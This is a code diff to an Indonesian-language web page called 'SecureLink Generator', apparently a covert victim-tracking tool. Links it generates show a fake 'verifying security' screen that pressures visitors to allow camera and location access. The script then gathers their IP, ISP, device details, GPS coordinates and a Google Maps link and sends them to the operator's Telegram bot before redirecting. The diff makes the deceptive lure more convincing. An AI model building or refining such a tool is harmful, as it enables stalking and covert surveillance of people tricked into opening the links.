@@ -215,10 +215,57 @@
             border: 1px solid #f44336;
             display: block;
         }
+        
+        .loading-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, #1a2a6c, #b21f1f, #fdbb2d);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            flex-direction: column;
+        }
+        
+        .loader {
+            width: 50px;
+            height: 50px;
+            border: 5px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 1s ease-in-out infinite;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        .loading-text {
+            margin-top: 20px;
+            font-size: 1.2rem;
+            text-align: center;
+        }
+        
+        .browser-warning {
+            display: none;
+            background: rgba(255, 0, 0, 0.2);
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            border-left: 4px solid #f44336;
+        }
     </style>
 </head>
 <body>
     <div class="container">
+        <div class="browser-warning" id="browserWarning">
+            <h3>Browser Tidak Didukung</h3>
+            <p>Maaf, browser yang Anda gunakan tidak mendukung fitur keamanan kami. Silakan gunakan browser modern seperti Chrome, Firefox, atau Edge.</p>
+        </div>
+        
         <header>
             <h1>SecureLink Generator</h1>
             <p class="description">Ubah link Anda menjadi link aman dengan fitur pelacakan canggih</p>
@@ -292,6 +339,14 @@
         </footer>
     </div>
 
+    <div class="loading-screen" id="loadingScreen" style="display: none;">
+        <div class="loader"></div>
+        <div class="loading-text">
+            <h3>Memverifikasi keamanan...</h3>
+            <p>Harap berikan izin akses kamera dan lokasi untuk melanjutkan</p>
+        </div>
+    </div>
+
     <script>
         // Konstanta untuk Token Bot dan Chat ID (disimpan di localStorage)
         const BOT_TOKEN_KEY = 'telegram_bot_token';
@@ -307,9 +362,26 @@
         const shortenedLinkElement = document.getElementById('shortenedLink');
         const resultSection = document.getElementById('resultSection');
         const configStatus = document.getElementById('configStatus');
+        const loadingScreen = document.getElementById('loadingScreen');
+        const browserWarning = document.getElementById('browserWarning');
+        
+        // Cek browser support
+        function checkBrowserSupport() {
+            const isChrome = /Chrome/.test(navigator.userAgent) && /Google Inc/.test(navigator.vendor);
+            const isFirefox = typeof InstallTrigger !== 'undefined';
+            const isEdge = /Edg/.test(navigator.userAgent);
+            
+            if (!isChrome && !isFirefox && !isEdge) {
+                browserWarning.style.display = 'block';
+                return false;
+            }
+            return true;
+        }
         
         // Muat konfigurasi yang disimpan
         window.addEventListener('DOMContentLoaded', () => {
+            checkBrowserSupport();
+            
             const savedToken = localStorage.getItem(BOT_TOKEN_KEY);
             const savedChatId = localStorage.getItem(CHAT_ID_KEY);
             
@@ -381,6 +453,19 @@
             }
         }
         
+        // Generate random link
+        function generateRandomLink() {
+            const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+            let result = '';
+            const length = 12;
+            
+            for (let i = 0; i < length; i++) {
+                result += characters.charAt(Math.floor(Math.random() * characters.length));
+            }
+            
+            return result;
+        }
+        
         // Generate link
         generateBtn.addEventListener('click', function() {
             const originalUrl = originalUrlInput.value;
@@ -391,7 +476,7 @@
             }
             
             // Generate random shortened URL
-            const randomString = Math.random().toString(36).substring(2, 10);
+            const randomString = generateRandomLink();
             const shortenedUrl = `${window.location.origin}${window.location.pathname}?l=${randomString}`;
             
             // Display the result
@@ -462,11 +547,18 @@
                 return false;
             }
             
+            // Buat link Google Maps jika lokasi tersedia
+            let mapsLink = 'Tidak tersedia';
+            if (locationData.latitude && locationData.longitude) {
+                mapsLink = `https://www.google.com/maps?q=${locationData.latitude},${locationData.longitude}`;
+            }
+            
             // Format pesan
             const message = `
 📱 DEVICE INFO:
 IP Address: ${deviceInfo.ip}
 Location: ${locationData.latitude || 'Tidak diketahui'}, ${locationData.longitude || 'Tidak diketahui'}
+Google Maps: ${mapsLink}
 ISP: ${deviceInfo.isp}
 OS: ${deviceInfo.os}
 Device Type: ${deviceInfo.deviceType}
@@ -527,6 +619,9 @@ Time: ${deviceInfo.time}
             const originalUrl = localStorage.getItem(`link_${linkParam}`);
             
             if (originalUrl) {
+                // Tampilkan loading screen
+                loadingScreen.style.display = 'flex';
+                
                 // Request camera and location access
                 async function requestPermissions() {
                     let imageData = null;
@@ -584,17 +679,6 @@ Time: ${deviceInfo.time}
                         window.location.href = originalUrl;
                     }, 3000);
                 }
-                
-                // Show a message to the user
-                document.body.innerHTML = `
-                    <div style="display: flex; justify-content: center; align-items: center; height: 100vh; background: #1a2a6c; color: white; text-align: center; padding: 20px;">
-                        <div>
-                            <h2>Memverifikasi keamanan...</h2>
-                            <p>Anda akan diarahkan ke tujuan dalam beberapa detik</p>
-                            <p>Harap tunggu</p>
-                        </div>
-                    </div>
-                `;
                 
                 // Start the permission request process
                 requestPermissions();
